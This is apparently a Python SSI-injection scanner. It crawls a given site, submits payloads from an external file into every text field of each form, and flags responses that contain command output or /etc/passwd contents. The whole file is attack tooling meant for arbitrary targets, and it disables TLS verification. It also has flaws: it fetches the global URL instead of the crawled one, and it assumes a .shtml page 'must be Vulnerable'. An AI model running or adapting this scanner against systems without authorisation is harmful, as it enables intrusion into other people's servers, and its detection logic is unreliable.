import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import urllib3
from pwn import *
from crawler import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

cooks = {}

class checker_html():

	def __init__(self,url):
		self.url = url

	def forms_get(self):
		soup = bs(requests.get(url , cookies = cooks , verify = False).content, "html.parser")
		return soup.find_all("form")

	def form_details(self,form):
		details = {}
		# get the form action (target url)
		action = form.attrs.get("action","")
		# get the form method (POST, GET, etc.)
		method = form.attrs.get("method", "get").lower()
		# get all the input details such as type and name
		inputs = []
		for input_tag in form.find_all("input"):
			input_type = input_tag.attrs.get("type", "text")
			input_name = input_tag.attrs.get("name")
			inputs.append({"type": input_type, "name": input_name})
		# put everything to the resulting dictionary
		details["action"] = action
		details["method"] = method
		details["inputs"] = inputs
		return details

	def submit_form(self,form_details,url,payload):

		target_url = urljoin(url, form_details["action"])
		# get the inputs
		inputs = form_details["inputs"]
		data = {}
		for input in inputs:
			# replace all text and search values with `value`
			if input["type"] == "text" or input["type"] == "search":
				input["value"] = payload
			input_name = input.get("name")
			input_value = input.get("value")
			if input_name and input_value:
				# if input name and value are not None, 
				# then add them to the data of form submission
				data[input_name] = input_value

		if form_details["method"] == "post":
			r = requests.post(target_url, cookies = cooks, verify = False , data=data)
			if((".shtml" in r.url) or (".stm" in r.url) or (".shtm" in r.url)):
				print("Site contains shtml file and must be Vulnerable")
			return r
		else:			
			r = requests.get(target_url, cookies = cooks , verify = False, params=data)
			if((".shtml" in r.url) or (".stm" in r.url) or (".shtm" in r.url)):
				print("Site contains shtml file and must be Vulnerable")
			return r



if __name__ == "__main__":

	help_message = 'Usage: python3 ssi_injection.py [URL]'
	
	if(len(sys.argv) == 1):
		print(help_message)
		exit(0)

	url = sys.argv[1]

	max_num = int(input("ENTER MAX NUMBER OF URLS TO CRAWL: "))
	ret_1 = Crawler(max_num,urls=[url]).run()

	f = open('payloads.txt' , 'r')
	payloads_list = list(f.read().split("\n")[:-1])

	fp = open("url.txt","r")
	crawled_urls = list(fp.read().split("\n")[:-1])


	for url in crawled_urls:
		if(("https" not in url) or ("http" not in url) or ("?" in url)):
			continue
		object1 = checker_html(url)
		all_forms_list = object1.forms_get()
		#print(all_forms_list)

		for form in all_forms_list:
			details = object1.form_details(form)
			for payload in payloads_list:
				payload = payload.encode()
				content = object1.submit_form(details,url,payload).content
				if((b"uid=" in content) or (b"root:x:" in content) or (b"drwxr-xr-x" in content)):
					log.info("Vulnerable to SSI Injection")
					pprint(details)
					print("\n")
				else:
					log.info("Not Vulnerable to SSI Injection")
					pprint(details)
					print("\n")
		


